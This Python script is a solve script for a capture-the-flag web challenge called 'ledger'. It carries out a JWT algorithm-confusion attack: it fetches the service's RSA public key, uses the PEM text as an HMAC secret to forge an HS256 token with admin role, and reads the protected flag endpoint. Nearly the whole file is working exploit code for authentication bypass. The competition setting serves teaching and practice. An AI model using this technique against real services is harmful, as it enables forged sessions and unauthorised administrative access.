#!/usr/bin/env python3
"""
CryoVault Finals - "ledger" (Web, 500 pts)

RS256 -> HS256 algorithm-confusion attack.

The service signs session tokens with RS256 and publishes its public key at
GET /pubkey.  The verifier, however, accepts both RS256 and HS256 and passes
the *same* key material (the PEM text loaded from disk, trailing newline
included) to the verifier regardless of the algorithm named in the header.

So we can take the public PEM, switch the header to HS256 and use the PEM
bytes themselves as the HMAC secret.  Any token we sign that way verifies,
which lets us set role=admin and read GET /flag.

Run:  python solve.py
Deps: requests
"""
import base64
import hashlib
import hmac
import json
import sys

import requests

BASE = "https://isfcrpesu-ledger.chals.io"


def b64url(data: bytes) -> str:
    """Unpadded base64url, as JWT requires."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def mint_hs256(header: dict, payload: dict, secret: bytes) -> str:
    """Hand-rolled HS256 JWT (PyJWT refuses to HMAC an asymmetric PEM key)."""
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def main() -> str:
    s = requests.Session()

    # 1. Recover the service signing key (public half) exactly as served.
    pem = s.get(f"{BASE}/pubkey", timeout=15).text
    print(f"[*] fetched public key ({len(pem)} bytes)")

    # 2. Grab a normal token so we know the real claims shape.
    tok = s.post(f"{BASE}/login", json={"user": "guest"}, timeout=15).json()["token"]
    payload = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
    print(f"[*] baseline claims: {payload}")

    # 3. Algorithm confusion: sign HS256 with the PEM text as the HMAC secret.
    payload["user"] = "admin"
    payload["role"] = "admin"
    forged = mint_hs256({"alg": "HS256", "typ": "JWT"}, payload, pem.encode())
    print(f"[*] forged token: {forged[:60]}...")

    # 4. Spend the admin token on the sealed ledger.
    r = s.get(f"{BASE}/flag", headers={"Authorization": f"Bearer {forged}"}, timeout=15)
    print(f"[*] GET /flag -> {r.status_code} {r.text}")
    r.raise_for_status()

    flag = r.json()["flag"]
    assert flag.startswith("isfcr{") and flag.endswith("}"), f"bad flag: {flag!r}"
    print(f"\n[+] FLAG: {flag}")
    return flag


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001 - surface the real failure
        print(f"[-] failed: {exc}", file=sys.stderr)
        sys.exit(1)
